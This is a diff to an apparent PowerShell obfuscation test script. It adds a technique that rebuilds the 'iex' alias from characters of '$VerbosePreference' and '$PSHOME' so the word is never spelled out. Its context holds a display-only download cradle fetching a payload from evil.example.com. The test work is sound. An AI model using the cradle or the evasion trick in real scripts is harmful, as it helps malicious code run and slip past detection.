@@ -66,5 +66,18 @@ Write-Host "[TEST] Obfuscated download cradle:"
 $cradle = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')"
 Write-Host "Cradle (display only): $cradle"
 
+# ── Technique 10: Automatic-variable index abuse ──
+# Pull characters from the *default* value of well-known automatic
+# variables. `$VerbosePreference` is `SilentlyContinue` on a stock
+# install — characters 1 and 3 are `i` and `e`, so
+# `$VerbosePreference.toString()[1,3] + 'x' -join ''` reconstructs `iex`
+# without ever spelling it. `$PSHOME` is the Windows PowerShell install
+# path; characters 4 and 34 build another two-letter cmdlet alias.
+Write-Host "[TEST] Automatic-variable index abuse:"
+$autoIex   = $VerbosePreference.toString()[1,3] + 'x' -join ''
+$autoBuilt = $PSHOME[4]+$PSHOME[34]+'x'
+Write-Host "Built from `$VerbosePreference: $autoIex"
+Write-Host "Built from `$PSHOME: $autoBuilt"
+
 Write-Host ""
 Write-Host "[DONE] All PowerShell obfuscation test patterns rendered."
